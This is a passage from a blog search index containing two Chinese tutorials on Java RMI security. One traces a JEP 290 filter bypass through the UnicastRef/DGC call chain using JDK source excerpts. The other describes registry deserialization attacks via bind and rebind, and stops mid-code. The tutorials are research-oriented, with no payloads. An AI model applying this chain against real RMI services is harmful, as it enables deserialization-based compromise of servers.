<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java安全-RMI之Java高版本绕过</title>
    <link href="/2025/09/26/Java%E5%AE%89%E5%85%A8-RMI%E4%B9%8BJava%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/"/>
    <url>/2025/09/26/Java%E5%AE%89%E5%85%A8-RMI%E4%B9%8BJava%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-RMI之Java高版本绕过"><a href="#Java安全-RMI之Java高版本绕过" class="headerlink" title="Java安全-RMI之Java高版本绕过"></a>Java安全-RMI之Java高版本绕过</h1><h2 id="Java高版本限制"><a href="#Java高版本限制" class="headerlink" title="Java高版本限制"></a>Java高版本限制</h2><p>在Java高版本中，在<code>RegistryImpl</code>类中新加了一个<code>registryFilter</code>方法，里面对所传入的序列化对象的类型进行了限制      </p><p>可以看到传入注册中心的String类型是只能在设定好的类之中的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (String.class == clazz<br>                || java.lang.Number.class.isAssignableFrom(clazz)<br>                || Remote.class.isAssignableFrom(clazz)<br>                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)<br>                || UnicastRef.class.isAssignableFrom(clazz)<br>                || RMIClientSocketFactory.class.isAssignableFrom(clazz)<br>                || RMIServerSocketFactory.class.isAssignableFrom(clazz)<br>                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;<br>            <span class="hljs-keyword">return</span> ObjectInputFilter.Status.ALLOWED;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> ObjectInputFilter.Status.REJECTED;<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>如果想要继续攻击，可利用的类只有 Proxy 和 UnicastRef  这两个类</p><p>进去到UnicastRef这个类，发现invoke方法是并没有被修复的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Remote var1, Method var2, Object[] var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;<br>            clientRefLog.log(Log.VERBOSE, <span class="hljs-string">&quot;method: &quot;</span> + var2);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;<br>            <span class="hljs-built_in">this</span>.logClientCall(var1, var2);<br>        &#125;<br><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.ref.getChannel().newConnection();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>        Object var11;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;<br>                clientRefLog.log(Log.VERBOSE, <span class="hljs-string">&quot;opnum = &quot;</span> + var4);<br>            &#125;<br><br>            <span class="hljs-type">StreamRemoteCall</span> <span class="hljs-variable">var46</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamRemoteCall</span>(var6, <span class="hljs-built_in">this</span>.ref.getObjID(), -<span class="hljs-number">1</span>, var4);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var46.getOutputStream();<br>                <span class="hljs-built_in">this</span>.marshalCustomCallData(var10);<br>                var11 = var2.getParameterTypes();<br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var12 &lt; ((Object[])var11).length; ++var12) &#123;<br>                    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var39) &#123;<br>                clientRefLog.log(Log.BRIEF, <span class="hljs-string">&quot;IOException marshalling arguments: &quot;</span>, var39);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var39);<br>            &#125;<br><br>            var46.executeCall();<br></code></pre></td></tr></table></figure><p>如果想要攻击服务端，我们想到的是让服务端发起一个客户端请求，这样就有可能在服务端引发一个反序列化攻击</p><p>(其实刚听到这种攻击思路是没有理解的)</p><p>先要调用invoke函数，是需要一个stub的，需要creatProxy函数去创建</p><p>找到的是DGC这个类可以被利用，然后调用它的<code>clean</code>或者<code>dirty</code>方法去触发他的<code>invoke</code>方法</p><p>我们直接走向最终找到的<code>DGCClient</code>内部类的<code>EndpointEntry</code>的构造方法方法</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">EndpointEntry</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Endpoint endpoint)</span> &#123;<br>            <span class="hljs-built_in">this</span>.endpoint = endpoint;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">LiveRef</span> <span class="hljs-variable">dgcRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(dgcID, endpoint, <span class="hljs-literal">false</span>);<br>                dgc = (DGC) Util.createProxy(DGCImpl.class,<br>                                             <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(dgcRef), <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;internal error creating DGC stub&quot;</span>);<br>            &#125;<br>            renewCleanThread =  AccessController.doPrivileged(<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewThreadAction</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RenewCleanThread</span>(),<br>                                    <span class="hljs-string">&quot;RenewClean-&quot;</span> + endpoint, <span class="hljs-literal">true</span>));<br>            renewCleanThread.start();<br>        &#125;<br></code></pre></td></tr></table></figure><p>利用反序列化去创建一个stub，可以利用它在服务端去发起一个客户端请求</p><p>现在是要去找一个反序列化入口点，我们开始查找用法                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </p><p>EndpointEntry -&gt; lookup -&gt; registerRefs</p><p>到registerRefs这里查找用法时会出现两处调用点</p><p><img src="/img/RMI/r83.png"></p><p>我们看<code>read</code>方法中，如果这个输入流不是并且不继承于<code>ConnectionInputStream</code>的话，就会调用我们的<code>registerRefs</code>方法，但是这个in是一个<code>ConnectionInputStream</code>，在RMI的输入流中基本都是ConnectionInputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (in <span class="hljs-keyword">instanceof</span> ConnectionInputStream) &#123;<br>            <span class="hljs-type">ConnectionInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> (ConnectionInputStream)in;<br>            <span class="hljs-comment">// save ref to send &quot;dirty&quot; call after all args/returns</span><br>            <span class="hljs-comment">// have been unmarshaled.</span><br>            stream.saveRef(ref);<br>            <span class="hljs-keyword">if</span> (isResultStream) &#123;<br>                <span class="hljs-comment">// set flag in stream indicating that remote objects were</span><br>                <span class="hljs-comment">// unmarshaled.  A DGC ack should be sent by the transport.</span><br>                stream.setAckNeeded();<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            DGCClient.registerRefs(ep, Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>[] &#123; ref &#125;));<br>        &#125;<br></code></pre></td></tr></table></figure><p>所以我们看到另一个方法调用ConnectionInputStream#registerRefs</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">registerRefs</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.incomingRefTable.isEmpty()) &#123;<br>           <span class="hljs-keyword">for</span>(Map.Entry var2 : <span class="hljs-built_in">this</span>.incomingRefTable.entrySet()) &#123;<br>               DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><p>继续向前查找最终的流程是<code>releaseInputStream</code>去调用<code>ConnectionInputStream.registerRefs</code>然后进入到if中（这个判断条件中的incomingRefTable是为空的，我们后续会说怎么走到if里面）调用<code>DGCClient.registerRefs</code></p><p><img src="/img/RMI/r84.png"></p><p>顺着向前查找，发现DGCImpl_Skel中dispatch是会调用这个方法的</p><p>不管走到哪个case里，都会调用releaseInputStream方法</p><p><img src="/img/RMI/r85.png"></p><h3 id="incomingRefTable赋值"><a href="#incomingRefTable赋值" class="headerlink" title="incomingRefTable赋值"></a>incomingRefTable赋值</h3><p><strong>实际上反序列化流程，只是为了给incomingRefTable赋值，攻击流程实际是在正常的调用流程中</strong></p><p>如何调用<code>ConnectionInputStream.registerRefs</code>然后进入到if中</p><p>选中incomingRefTable右键查找用法</p><p>来到ConnectionInputStream.saveRef -&gt; LiveRef.read -&gt; UnicastRef.readExternal</p><p><code>ConnectionInputStream</code>的<code>saveRef</code>中，向里面put进去了一个东西，使他不为空</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">void</span> <span class="hljs-title function_">saveRef</span><span class="hljs-params">(LiveRef ref)</span> &#123;<br><span class="hljs-type">Endpoint</span> <span class="hljs-variable">ep</span> <span class="hljs-operator">=</span> ref.getEndpoint();<br><br><span class="hljs-comment">// check whether endpoint is already in the hashtable</span><br>List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);<br><br><span class="hljs-keyword">if</span> (refList == <span class="hljs-literal">null</span>) &#123;<br>    refList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;LiveRef&gt;();<br>    incomingRefTable.put(ep, refList);<br>&#125;<br><br><span class="hljs-comment">// add ref to list of refs for endpoint ep</span><br>refList.add(ref);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>saveRef</code>也是只有一个地方去调用，就是<code>read</code>方法，我们之前讨论过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LiveRef <span class="hljs-title function_">read</span><span class="hljs-params">(ObjectInput in, <span class="hljs-type">boolean</span> useNewFormat)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        ......<br><br>        <span class="hljs-keyword">if</span> (in <span class="hljs-keyword">instanceof</span> ConnectionInputStream) &#123;<br>            <span class="hljs-type">ConnectionInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> (ConnectionInputStream)in;<br>            <span class="hljs-comment">// save ref to send &quot;dirty&quot; call after all args/returns</span><br>            <span class="hljs-comment">// have been unmarshaled.</span><br>            stream.saveRef(ref);<br>            <span class="hljs-keyword">if</span> (isResultStream) &#123;<br>                <span class="hljs-comment">// set flag in stream indicating that remote objects were</span><br>                <span class="hljs-comment">// unmarshaled.  A DGC ack should be sent by the transport.</span><br>                stream.setAckNeeded();<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            DGCClient.registerRefs(ep, Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>[] &#123; ref &#125;));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ref;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看看谁调用了<code>read</code>方法，只有<code>UnicastRef</code>和<code>UnicastRef2</code>中的<code>readExternal</code>去调用了<code>read</code>方法</p><p><code>readExternal</code>是一个和<code>readObject</code>类似但不一样的东西，如果所反序列化的类，也有<code>readExternal</code>方法，也会去调用<code>readExternal</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readExternal</span><span class="hljs-params">(ObjectInput in)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        ref = LiveRef.read(in, <span class="hljs-literal">false</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="具体调用流程"><a href="#具体调用流程" class="headerlink" title="具体调用流程"></a>具体调用流程</h2><p><code>UnicastRef</code>是白名单里面的内容，我们向客户端传入一个<code>UnicastRef</code>对象触发它的<code>readexternal</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readExternal</span><span class="hljs-params">(ObjectInput var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-built_in">this</span>.ref = LiveRef.read(var1, <span class="hljs-literal">false</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>进入到<code>LiveRef.read</code>中… 剩下的调用我们就不再重复</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LiveRef <span class="hljs-title function_">read</span><span class="hljs-params">(ObjectInput var0, <span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ......<br>        <span class="hljs-keyword">if</span> (var0 <span class="hljs-keyword">instanceof</span> ConnectionInputStream) &#123;<br>            <span class="hljs-type">ConnectionInputStream</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (ConnectionInputStream)var0;<br>            var6.saveRef(var5);<br>            <span class="hljs-keyword">if</span> (var4) &#123;<br>                var6.setAckNeeded();<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            DGCClient.registerRefs(var2, Arrays.asList(var5));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var5;<br>    &#125;<br><br>...<br></code></pre></td></tr></table></figure><p>后续会走到<code>EndpointEntry</code>中，在创建完dgc后会走到下面创建一个<code>RenewCleanThread</code>线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">EndpointEntry</span><span class="hljs-params">(Endpoint var1)</span> &#123;<br>            <span class="hljs-built_in">this</span>.endpoint = var1;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">LiveRef</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(DGCClient.dgcID, var1, <span class="hljs-literal">false</span>);<br>                <span class="hljs-built_in">this</span>.dgc = (DGC)Util.createProxy(DGCImpl.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(var2), <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (RemoteException var3) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;internal error creating DGC stub&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.renewCleanThread = (Thread)AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NewThreadAction</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RenewCleanThread</span>(), <span class="hljs-string">&quot;RenewClean-&quot;</span> + var1, <span class="hljs-literal">true</span>));<br>            <span class="hljs-built_in">this</span>.renewCleanThread.start();<br>        &#125;<br></code></pre></td></tr></table></figure><p><code>RenewCleanThread</code>中，会调用<code>DGCClient</code>的<code>makeDirtyCall</code>方法，而这个方法最终会调用他的<code>dirty</code>方法，就会调用到<code>invoke</code>方法，最终让服务器发送客户端请求</p><p><img src="/img/RMI/r86.png"></p><p><img src="/img/RMI/r87.png"></p><h2 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h2><p>到这里只是分析了高版本绕过可以调用的链子</p><p>具体的实战分析主要可以查看此文章：</p><p><a href="https://link.zhihu.com/?target=https://m0d9.me/2020/07/02/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8A/">RMI：绕过JEP290——上</a></p><p><a href="https://link.zhihu.com/?target=https://m0d9.me/2020/07/11/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%AD/">RMI：绕过JEP290——中</a></p><p><a href="https://link.zhihu.com/?target=https://m0d9.me/2020/07/15/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8B/">RMI：绕过JEP290——下</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>RMI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-RMI的攻击方式</title>
    <link href="/2025/09/25/Java%E5%AE%89%E5%85%A8-RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <url>/2025/09/25/Java%E5%AE%89%E5%85%A8-RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI的基本攻击方式"><a href="#RMI的基本攻击方式" class="headerlink" title="RMI的基本攻击方式"></a>RMI的基本攻击方式</h1><p>我们知道，利用RMI攻击主要是与反序列化漏洞结合，源代码中调用了readObject方法的抵挡，就有可能被攻击</p><p>那么与上一篇RMI基础结合，大致可以分为以下三种攻击方式</p><ul><li>RMI Client 打 RMI Registry</li><li>RMI Client 打 RMI Server</li><li>RMI Client</li></ul><h2 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h2><p>注册中心的交互主要是这一句话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">registry.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>,obj);<br></code></pre></td></tr></table></figure><p>我们在分析源码的时候看到过，与注册中心交互时，可调用的不只着一种方法</p><p>这几种方法位于 <code>RegistryImpl_Skel#dispatch</code> 中，如果存在对传入的对象调用 <code>readObject()</code> 方法，则可以利用，<code>dispatch</code> 里面对应关系如下：</p><ul><li>0 –&gt; bind</li><li>1 –&gt; list</li><li>2 –&gt; lookup</li><li>3 –&gt; rebind</li><li>4 –&gt; unbind</li></ul><p>首先是 list 这种攻击，因为除了 list 和 lookup 两个，其余的交互在 8u121 之后都是需要 localhost 的。<br>但是讲道理，list 的这种攻击比较鸡肋。</p><h3 id="使用-list-方法进行攻击"><a href="#使用-list-方法进行攻击" class="headerlink" title="使用 list() 方法进行攻击"></a>使用 list() 方法进行攻击</h3><p>用 <code>list()</code> 方法可以列出目标上所有绑定的对象：</p><p>在 RMIClient 文件夹里面新建一个新的 Java class，因为我们后续的攻击肯定是从用户的客户端出发，往服务端这里打的。代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegistryListAttack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">RemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObj</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;;<br>        String[] s = Naming.list(<span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先运行RMI服务器，再运行此文件，可以看到控制台输出</p><p>在这里打印出的是绑定对象的信息</p><p><img src="/img/RMI/r76.png"></p><p>因为这里没有 <code>readObject()</code>，所以无法进行反序列化，这样我们的攻击面就太窄了。我们可以跳进 <code>RegistryImpl_Skel#dispatch</code> 看一下，list 对应的是 case1</p><p>只有 <code>writeObject()</code>，没有 <code>readObject()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            var2.releaseInputStream();<br>            String[] var97 = var6.list();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var98</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                var98.writeObject(var97);<br>                <span class="hljs-keyword">break</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>            &#125;<br></code></pre></td></tr></table></figure><p>实际上是不能算作攻击的</p><h3 id="bind-或-rebind-的攻击"><a href="#bind-或-rebind-的攻击" class="headerlink" title="bind 或 rebind 的攻击"></a>bind 或 rebind 的攻击</h3><p>我们知道，这两者对应的case分别为0，3</p><p>其源码如下，两个方法中都是存在反序列化的，反序列化的东西均为 <strong>一个参数名和一个远程对象</strong></p><p>这两者的均可以作为反序列化的入口类，若该服务端导入了CC的依赖，我们就可以利用这里的反序列化入口，进行CC链的反序列化攻击</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var11 = var2.getInputStream();<br>                    var7 = (String)var11.readObject();<br>                    var8 = (Remote)var11.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var7, var8);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>                &#125;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var11 = var2.getInputStream();<br>                    var7 = (String)var11.readObject();<br>                    var8 = 